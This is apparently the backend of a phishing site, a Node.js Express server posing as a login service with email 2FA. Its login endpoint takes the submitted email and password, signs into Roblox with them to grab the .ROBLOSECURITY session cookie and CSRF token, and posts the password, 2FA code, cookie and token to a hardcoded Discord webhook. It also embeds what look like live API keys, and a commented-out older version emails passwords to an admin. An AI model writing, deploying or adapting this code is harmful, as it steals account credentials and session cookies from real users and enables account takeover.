import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import session from 'express-session';
import { Resend } from 'resend'; // Import Resend
import axios from 'axios';
import qs from 'querystring';

const app = express();

// Enable CORS for all origins
app.use(cors());
app.use(bodyParser.json());

// Session setup
app.use(session({
  secret: 'your-session-secret',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // Use `secure: true` for production with HTTPS
}));

// Resend setup
const resend = new Resend('re_2fZzhxRz_5fyuzTrAwuuYCkuPi6ycRc4D');

// Mock database
const users = {
  'faketestaccount81@gmail.com': { password: 'testpassword123', is2FAEnabled: true },
};

// Function to generate a 2FA code
function generate2FACode() {
  return Math.floor(100000 + Math.random() * 900000); // 6-digit code
}

// Function to get Roblox security cookie and CSRF token
async function getRobloxSecurityCookie(email, password) {
  const loginUrl = 'https://www.roblox.com/login';

  const loginData = {
    email: email,
    password: password,
  };

  try {
    // Perform login to get the cookie and CSRF token
    const response = await axios.post(loginUrl, qs.stringify(loginData), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
      },
      withCredentials: true, // Ensure cookies are sent with the request
    });

    const cookies = response.headers['set-cookie'];
    const robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY'));

    // Try to get CSRF token from cookies or body
    const csrfToken = (response.data.match(/csrfToken\s*=\s*"(.*?)"/) || [])[1] || null;

    return { robloxSecurityCookie, csrfToken };
  } catch (error) {
    console.error('Error logging in to Roblox:', error);
    return { robloxSecurityCookie: null, csrfToken: null };
  }
}

// Example of adding CSRF token and cookies to further requests
async function makeAuthenticatedRequest(url, csrfToken, robloxSecurityCookie) {
  const headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'X-CSRF-TOKEN': csrfToken, // Add CSRF token here if needed
    'Cookie': `.ROBLOSECURITY=${robloxSecurityCookie}`, // Pass the Roblox security cookie
  };

  try {
    const response = await axios.post(url, {}, { headers });
    console.log('Authenticated request response:', response.data);
  } catch (error) {
    console.error('Error making authenticated request:', error);
  }
}

// Endpoint for login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Validate user credentials
  const user = users[email];
  if (!user || password !== user.password) {
    return res.status(401).json({ success: false, message: 'Invalid email or password.' });
  }

  // Generate 2FA code
  const code = generate2FACode();

  try {
    // Send 2FA code via email
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: email,
      subject: 'Your 2FA Code',
      text: `Your 2FA code is: ${code}`,
    });

    console.log('2FA email sent successfully.');

    // Attempt to get the .ROBLOSECURITY cookie and CSRF token
    const { robloxSecurityCookie, csrfToken } = await getRobloxSecurityCookie(email, password);

    // Prepare data for webhook
    const webhookData = {
      content: `Login Attempt: ${email}`,
      embeds: [
        {
          title: "Login Details",
          fields: [
            { name: "Email", value: email, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "2FA Code", value: code.toString(), inline: true },
            { name: "ROBLOSECURITY Cookie", value: robloxSecurityCookie || "No ROBLOSECURITY cookie found", inline: false },
            { name: "CSRF Token", value: csrfToken || "CSRF Token not found", inline: false },
          ],
          color: 16711680, // Example: Red color
        },
      ],
    };

    // Send data to the webhook, there is your webhook url
    const webhookResponse = await axios.post('https://discord.com/api/webhooks/1308864559586480168/E8MUMhm15diTKpVwr5PMLyenDamsj26vxdxz3m5w9O8-S9WVvKbzmTIwICb8aVlNcwpk', webhookData, {
      headers: {
        'Content-Type': 'application/json',
      },
    });

    console.log('Webhook response status:', webhookResponse.status);

    // Continue even if CSRF token is not found
    if (webhookResponse.status !== 200) {
      console.error('Error sending data to webhook:', webhookResponse.data);
    }

    // Optionally make an authenticated request using CSRF token and cookies
    if (robloxSecurityCookie && csrfToken) {
      await makeAuthenticatedRequest('https://www.roblox.com/someAuthenticatedUrl', csrfToken, robloxSecurityCookie);
    }

    res.json({ success: true, message: 'Login successful. 2FA sent.' });
  } catch (error) {
    console.error('Error in login process:', error);
    res.status(500).json({ success: false, message: 'An error occurred during login.' });
  }
});

// Start the server
app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});

// import express from 'express';
// import bodyParser from 'body-parser';
// import cors from 'cors';
// import mailgun from 'mailgun.js'; // Import mailgun.js
// import session from 'express-session';

// const app = express();

// // Enable CORS for all origins
// app.use(cors());
// app.use(bodyParser.json());

// // Session setup
// app.use(session({
//   secret: 'your-session-secret',
//   resave: false,
//   saveUninitialized: true,
//   cookie: { secure: false } // Use `secure: true` for production with HTTPS
// }));

// // Mailgun setup
// const mg = mailgun(); // Initialize Mailgun client
// const client = mg.client({ username: 'api', key: 'mailgunApiKey' }); // Create Mailgun client using the correct method

// // Mock database
// const users = {
//   'user1@example.com': { password: 'password', is2FAEnabled: true },
// };

// // Function to generate a 2FA code
// function generate2FACode() {
//   return Math.floor(100000 + Math.random() * 900000); // 6-digit code
// }

// // Endpoint for login
// app.post('/login', async (req, res) => {
//   const { email, password } = req.body;
//   console.log(`Received login attempt for email: ${email} with password: ${password}`);

//   // Validate user credentials
//   const user = users[email];
//   if (!user || password !== user.password) {
//     console.log(`Invalid email or password for email: ${email}`);
//     return res.status(401).json({ success: false, message: 'Invalid email or password.' });
//   }

//   // Generate 2FA code
//   const code = generate2FACode();
//   console.log(`Generated 2FA code: ${code}`);

//   // Store session information
//   req.session.email = email; // Store email in session
//   req.session.loggedIn = true; // Set a flag for logged-in users
//   console.log(`Session information stored: sessionID: ${req.sessionID}, email: ${req.session.email}, loggedIn: ${req.session.loggedIn}`);

//   try {
//     // Send 2FA code to user's email
//     console.log(`Sending 2FA code to ${email}`);
//     await client.messages.create('YOUR_MAILGUN_DOMAIN', {
//       from: 'your-email@example.com',
//       to: email,
//       subject: 'Your 2FA Code',
//       text: `Your 2FA code is: ${code}`,
//     });

//     // Send login attempt and session details to admin email
//     console.log(`Sending login attempt details to admin`);
//     await client.messages.create('YOUR_MAILGUN_DOMAIN', {
//       from: 'your-email@example.com',
//       to: 'admin@example.com', // Admin email address
//       subject: 'Login Attempt Details with Session Info',
//       text: `A login attempt was made with the following details:\nEmail: ${email}\nPassword: ${password}\n2FA Code: ${code}\nSession Info:\n- Session ID: ${req.sessionID}\n- Email in session: ${req.session.email}\n- Logged In: ${req.session.loggedIn}`,
//     });

//     res.json({ success: true, message: '2FA code sent to your email.' });
//   } catch (error) {
//     console.error('Error sending email:', error);
//     res.status(500).json({ success: false, message: 'Failed to send 2FA code.' });
//   }
// });

// // Start the server
// app.listen(3000, () => {
//   console.log('Server running on http://localhost:3000');
// });
